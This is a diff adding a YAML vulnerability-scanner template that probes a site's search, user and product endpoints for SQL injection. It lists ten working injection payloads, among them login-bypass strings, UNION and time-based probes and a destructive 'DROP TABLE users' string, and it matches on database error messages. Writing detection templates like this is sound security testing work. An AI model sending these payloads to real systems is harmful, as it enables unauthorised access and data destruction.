@@ -1,0 +1,48 @@
+id: aegis-advanced-sqli
+info:
+  author: AEGIS-X
+  classification:
+    cwe-id: CWE-89
+    owasp: A03:2021
+  description: Advanced SQL injection detection with multiple payloads
+  name: Advanced SQL Injection Detection
+  severity: high
+requests:
+- matchers:
+  - condition: or
+    type: word
+    words:
+    - mysql_fetch_array
+    - ORA-01756
+    - Microsoft OLE DB Provider
+    - SQLServer JDBC Driver
+    - PostgreSQL query failed
+    - sqlite3.OperationalError
+    - Database error
+    - SQL syntax error
+  - condition: or
+    regex:
+    - SQL.*error
+    - database.*error
+    - mysql.*error
+    - ORA-\d+
+    - ERROR.*SQL
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/search?q={{payload}}'
+  - '{{BaseURL}}/user?id={{payload}}'
+  - '{{BaseURL}}/product?id={{payload}}'
+  - '{{BaseURL}}/sql/search?username={{payload}}'
+  payloads:
+    payload:
+    - ''' OR ''1''=''1'
+    - ''' UNION SELECT 1,2,3--'
+    - '''; DROP TABLE users--'
+    - ''' AND (SELECT COUNT(*) FROM information_schema.tables)>0--'
+    - ''' OR 1=1#'
+    - admin'--
+    - ''' OR ''x''=''x'
+    - 1' AND SLEEP(5)--
+    - ''' UNION SELECT NULL,NULL,NULL--'
+    - ''' OR 1=1 LIMIT 1--'
